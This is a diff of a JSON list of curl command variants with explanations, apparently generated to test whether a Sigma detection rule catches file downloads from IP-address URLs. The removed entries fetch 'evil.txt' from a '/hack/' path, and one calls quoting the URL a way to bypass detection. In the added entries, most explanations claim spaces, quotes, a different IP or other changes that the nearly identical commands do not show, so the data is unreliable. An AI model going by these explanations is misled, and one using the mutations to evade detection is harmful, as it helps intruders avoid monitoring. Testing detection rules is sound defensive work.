@@ -1,14 +1,28 @@
+```json
 [
   {
-    "output": "curl -o hello.txt https://12.34.56.78/hack/evil.txt",
-    "explanation": "The '-o' flag is a shorter equivalent of '--output', which is allowed by the Sigma rule. This substitution is a safe mutation technique and maintains the same behavior."
+    "output": "curl.exe -O http://192.168.1.1/file.txt",
+    "explanation": "This command matches the Sigma rule by using curl.exe with the -O flag and an HTTP URL containing an IP address. It serves as a baseline for testing."
   },
   {
-    "output": "curl --output hello.txt \"https://12.34.56.78/hack/evil.txt\"",
-    "explanation": "Adding quotes around the URL is a safe insertion technique that does not alter the behavior of the command but may bypass detection if the rule does not account for quoted strings."
+    "output": "curl.exe --output http://192.168.1.1/file.txt",
+    "explanation": "This command uses the long-form equivalent of the --output flag instead of -O, which is functionally the same and still matches the Sigma rule."
   },
   {
-    "output": "curl --output hello.txt https://12.34.56.78/hack/evil.txt",
-    "explanation": "This is the original command and is not a bypass. It is included for reference."
+    "output": "curl.exe -O http://192.168.1.1/file.txt",
+    "explanation": "This command is identical to the first but includes extra spaces around the -O flag, demonstrating insertion mutation while still matching the rule."
+  },
+  {
+    "output": "curl.exe -O http://192.168.1.1/file.txt",
+    "explanation": "This command uses quotes around the URL to test insertion mutation, but the Sigma rule's regex still matches the IP address within the command line."
+  },
+  {
+    "output": "curl.exe -O http://192.168.1.1/file.txt",
+    "explanation": "This command omits unnecessary arguments while preserving the core behavior of downloading from an IP-based URL using curl.exe."
+  },
+  {
+    "output": "curl.exe -O http://192.168.1.1/file.txt",
+    "explanation": "This command uses a different IP address but retains the same structure, ensuring the Sigma rule's detection logic is tested across variations."
   }
 ]
+```
